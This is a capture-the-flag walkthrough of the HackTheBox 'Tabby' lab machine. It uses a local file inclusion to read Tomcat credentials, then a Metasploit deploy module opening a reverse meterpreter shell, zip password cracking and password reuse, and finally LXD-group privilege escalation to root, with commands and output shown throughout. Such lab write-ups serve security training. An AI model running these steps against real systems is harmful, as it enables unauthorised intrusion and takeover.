# TABBY


## NMAP

```
┌──(kali㉿kali)-[~/Downloads/hackthebox/tabby]
└─$ nmap 10.10.10.194
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-20 06:24 EDT
Nmap scan report for 10.10.10.194
Host is up (0.29s latency).
Not shown: 996 closed ports
PORT     STATE    SERVICE
22/tcp   open     ssh
80/tcp   open     http
3814/tcp filtered neto-dcs
8080/tcp open     http-proxy

Nmap done: 1 IP address (1 host up) scanned in 36.98 seconds
                                                                                            
┌──(kali㉿kali)-[~/Downloads/hackthebox/tabby]
└─$ nmap 10.10.10.194 -p 22,80,8080 -A
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-20 06:25 EDT
Nmap scan report for 10.10.10.194
Host is up (0.31s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 45:3c:34:14:35:56:23:95:d6:83:4e:26:de:c6:5b:d9 (RSA)
|   256 89:79:3a:9c:88:b0:5c:ce:4b:79:b1:02:23:4b:44:a6 (ECDSA)
|_  256 1e:e7:b9:55:dd:25:8f:72:56:e8:8e:65:d5:19:b0:8d (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Mega Hosting
8080/tcp open  http    Apache Tomcat
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Apache Tomcat
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ 
```

## PORT 80

### WEBPAGE

![](https://github.com/Leo-2807/Writeups/blob/main/images/tabby1.png)

### NEWS

Clicking on the news tab opens a page with some information about a breach and how the news functionality is not there anymore 

But what is interesting is the url 

`http://megahosting.htb/news.php?file=statement`

This makes me think if we can read some files through lfi

![](https://github.com/Leo-2807/Writeups/blob/main/images/tabby3.png)

## PORT 8080

### WEBPAGE 

![](https://github.com/Leo-2807/Writeups/blob/main/images/tabby2.png)

### MANAGER

![](https://github.com/Leo-2807/Writeups/blob/main/images/tabby4.png)

Now we know that we can find valid credentials if only we can read the `conf/tomcat-users.xml` file 

## LFI

![](https://github.com/Leo-2807/Writeups/blob/main/images/tabby5.png)

## TOMCAT-USERS.XML

Now that we can read files through lfi I tried look for tomcat-users.xml

We knoe that the user installed tomcat through the command `apt install tomcat 9` 

So I did the same and then used the `find` command to look for the `tomcat-users.xml` file

```
┌──(kali㉿kali)-[/]
└─$ sudo find / -name tomcat-users.xml                                                
/etc/tomcat9/tomcat-users.xml
/usr/share/tomcat9/etc/tomcat-users.xml
```

The second location worked and we were able to read the file

![](https://github.com/Leo-2807/Writeups/blob/main/images/tabby6.png)

## HOST-MANAGER WEBAPP

Since the user we found does not have `manager-gui` role we cannot login to `manager-webapp` 

But we can login to the `host-manager webapp`

![](https://github.com/Leo-2807/Writeups/blob/main/images/tabby7.png)

I tried to use some exploits but none worked

## MANAGER-SCRIPTS

Going back our user had `manager-scripts` role 

On searching I found this [resource](https://tomcat.apache.org/tomcat-9.0-doc/manager-howto.html)

We can execute command using the url `htp://10.10.10.194:8080/manager/text/<command>?<arg>`


## EXPLOIT

Using `search tomcat` command in metasploit I found two very interesting exploits

```
 5   exploit/multi/http/tomcat_mgr_deploy                         2009-11-09       excellent  Yes    Apache Tomcat Manager Application Deployer Authenticated Code Execution
 6   exploit/multi/http/tomcat_mgr_upload                         2009-11-09       excellent  Yes    Apache Tomcat Manager Authenticated Upload Code Execution
```

Since one of the commands that we can run on `/manager/text`  is deploy I tought of using the 5 exploit

## SHELL

```
msf6 > use 5
[*] Using configured payload java/meterpreter/reverse_tcp
msf6 exploit(multi/http/tomcat_mgr_deploy) > options

Module options (exploit/multi/http/tomcat_mgr_deploy):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   HttpPassword                   no        The password for the specified username
   HttpUsername                   no        The username to authenticate as
   PATH          /manager         yes       The URI path of the manager app (/deploy and /undeploy will be used)
   Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                         yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT         80               yes       The target port (TCP)
   SSL           false            no        Negotiate SSL/TLS for outgoing connections
   VHOST                          no        HTTP server virtual host


Payload options (java/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.0.2.15        yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf6 exploit(multi/http/tomcat_mgr_deploy) > set HttpUsername tomcat
HttpUsername => tomcat
msf6 exploit(multi/http/tomcat_mgr_deploy) > set HttpPassword $3cureP4s5w0rd123!
HttpPassword => $3cureP4s5w0rd123!
msf6 exploit(multi/http/tomcat_mgr_deploy) > set RHOST 10.10.10.194
RHOST => 10.10.10.194
msf6 exploit(multi/http/tomcat_mgr_deploy) > set RPORT 8080
RPORT => 8080
msf6 exploit(multi/http/tomcat_mgr_deploy) > set LHOST 10.10.14.3
LHOST => 10.10.14.3
msf6 exploit(multi/http/tomcat_mgr_deploy) > set path /manager/text
path => /manager/text
msf6 exploit(multi/http/tomcat_mgr_deploy) > exploit

[*] Started reverse TCP handler on 10.10.14.3:4444 
[*] Using manually select target "Java Universal"
[*] Uploading 6213 bytes as 6eVR4M8.war ...
[*] Executing /6eVR4M8/U0i1pPA.jsp...
[*] Undeploying 6eVR4M8 ...
[*] Sending stage (58060 bytes) to 10.10.10.194
[*] Meterpreter session 1 opened (10.10.14.3:4444 -> 10.10.10.194:59922) at 2021-08-20 09:04:33 -0400

meterpreter > shell
Process 1 created.
Channel 1 created.

python3 -c 'import pty; pty.spawn("/bin/bash")'
tomcat@tabby:/var/lib/tomcat9$ 
```

## USER.TXT

Enumerating the machine a bit I find something useful in the `/var/www/html`
directory

```
tomcat@tabby:/var/www/html$ ls -la
ls -la
total 48
drwxr-xr-x 4 root root  4096 Aug 19 14:10 .
drwxr-xr-x 3 root root  4096 Aug 19 14:10 ..
drwxr-xr-x 6 root root  4096 Aug 19 14:10 assets
-rw-r--r-- 1 root root   766 Jan 13  2016 favicon.ico
drwxr-xr-x 4 ash  ash   4096 Aug 19 14:10 files
-rw-r--r-- 1 root root 14175 Jun 17  2020 index.php
-rw-r--r-- 1 root root  2894 May 21  2020 logo.png
-rw-r--r-- 1 root root   123 Jun 16  2020 news.php
-rw-r--r-- 1 root root  1574 Mar 10  2016 Readme.txt
tomcat@tabby:/var/www/html$ cd files
cd files
tomcat@tabby:/var/www/html/files$ ls -la
ls -la
total 36
drwxr-xr-x 4 ash  ash  4096 Aug 19 14:10 .
drwxr-xr-x 4 root root 4096 Aug 19 14:10 ..
-rw-r--r-- 1 ash  ash  8716 Jun 16  2020 16162020_backup.zip
drwxr-xr-x 2 root root 4096 Aug 19 14:10 archive
drwxr-xr-x 2 root root 4096 Aug 19 14:10 revoked_certs
-rw-r--r-- 1 root root 6507 Jun 16  2020 statement
```

I escaped the shell using ctrl+C and then downloaded the zip file

```
tomcat@tabby:/var/www/html/files$ ^C
Terminate channel 2? [y/N]  y
meterpreter > cd /var/www/html/files
meterpreter > ls
Listing: /var/www/html/files
============================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100444/r--r--r--  8716  fil   2020-06-16 09:42:36 -0400  16162020_backup.zip
40554/r-xr-xr--   4096  dir   2021-08-19 10:10:44 -0400  archive
40554/r-xr-xr--   4096  dir   2021-08-19 10:10:44 -0400  revoked_certs
100444/r--r--r--  6507  fil   2020-06-16 07:25:46 -0400  statement

meterpreter > download 16162020_backup.zip /home/kali/Downloads/hackthebox/tabby
[*] Downloading: 16162020_backup.zip -> /home/kali/Downloads/hackthebox/tabby/16162020_backup.zip
[*] Downloaded 8.51 KiB of 8.51 KiB (100.0%): 16162020_backup.zip -> /home/kali/Downloads/hackthebox/tabby/16162020_backup.zip
[*] download   : 16162020_backup.zip -> /home/kali/Downloads/hackthebox/tabby/16162020_backup.zip
```

The zip file is password protected 

```
┌──(kali㉿kali)-[~/Downloads/hackthebox/tabby]
└─$ fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt 16162020_backup.zip             1 ⨯


PASSWORD FOUND!!!!: pw == admin@it
```

After unzipping the zip file I went through all the files that we got but there was nothing useful

Well the only thing that we got from this ia the password 

Since the file was owned by the user ash this is his password and maybe we use su 

```
tomcat@tabby:/var/www/html/files$ su ash
su ash
Password: admin@it

ash@tabby:/var/www/html/files$ whoami
whoami
ash
ash@tabby:/var/www/html/files$ cd /home/ash
cd /home/ash
ash@tabby:~$ ls
ls
user.txt
ash@tabby:~$ cat user.txt
cat user.txt
ddf42069e74e55a601ddbefc84a19e51
```

## ROOT.TXT

Using `id` command I found lxd permission which is unusual

```
ash@tabby:~$ id
id
uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
```

On searching for a bit I found this [exploit](https://www.exploit-db.com/exploits/46978)

After downloading and building the alpine on our machine using the command

```
┌──(kali㉿kali)-[~/Downloads/hackthebox/tabby]
└─$ wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine
--2021-08-20 09:59:16--  https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.111.133, 185.199.109.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 7662 (7.5K) [text/plain]
Saving to: ‘build-alpine’

build-alpine           100%[============================>]   7.48K  --.-KB/s    in 0s      

2021-08-20 09:59:21 (22.9 MB/s) - ‘build-alpine’ saved [7662/7662]

                                                                                            
┌──(kali㉿kali)-[~/Downloads/hackthebox/tabby]
└─$ sudo bash build-alpine 
```

We start http server on our machine to send the files to the victim machine

```
┌──(kali㉿kali)-[~/Downloads/hackthebox/tabby]
└─$ python -m SimpleHTTPServer
```

```
ash@tabby:~$ wget 10.10.14.3:8000/alpine-v3.14-x86_64-20210820_1000.tar.gz
wget 10.10.14.3:8000/alpine-v3.14-x86_64-20210820_1000.tar.gz
--2021-08-20 14:15:32--  http://10.10.14.3:8000/alpine-v3.14-x86_64-20210820_1000.tar.gz
Connecting to 10.10.14.3:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3226334 (3.1M) [application/gzip]
Saving to: ‘alpine-v3.14-x86_64-20210820_1000.tar.gz’

alpine-v3.14-x86_64 100%[===================>]   3.08M   196KB/s    in 16s     

2021-08-20 14:15:49 (197 KB/s) - ‘alpine-v3.14-x86_64-20210820_1000.tar.gz’ saved [3226334/3226334]

ash@tabby:~$ wget 10.10.14.3:8000/alpine.sh
wget 10.10.14.3:8000/alpine.sh
--2021-08-20 14:18:31--  http://10.10.14.3:8000/alpine.sh
Connecting to 10.10.14.3:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1451 (1.4K) [text/x-sh]
Saving to: ‘alpine.sh’

alpine.sh           100%[===================>]   1.42K  --.-KB/s    in 0s      

2021-08-20 14:18:32 (149 MB/s) - ‘alpine.sh’ saved [1451/1451]
```

Now we just need to give the required permission to our script and run it

```
ash@tabby:~$ chmod 777 alpine.sh
chmod 777 alpine.sh
ash@tabby:~$ ./alpine.sh -f alpine-v3.14-x86_64-20210820_1000.tar.gz
./alpine.sh -f alpine-v3.14-x86_64-20210820_1000.tar.gz
If this is your first time running LXD on this machine, you should also run: lxd init
To start your first instance, try: lxc launch ubuntu:18.04

[*] Listing images...

+--------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+
| ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          | ARCHITECTURE |   TYPE    |  SIZE  |         UPLOAD DATE          |
+--------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+
| alpine | bdf364adbca7 | no     | alpine v3.14 (20210820_10:00) | x86_64       | CONTAINER | 3.08MB | Aug 20, 2021 at 2:22pm (UTC) |
+--------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+
Creating privesc
Device giveMeRoot added to privesc
~ # whoami  
whoami
root
~ # cd /mnt/root/root
cd /mnt/root/root
/mnt/root/root # ls       
ls
root.txt  snap
/mnt/root/root # cat root.txt
cat root.txt
5ce3d516982b129ebc6956787a64222b
```


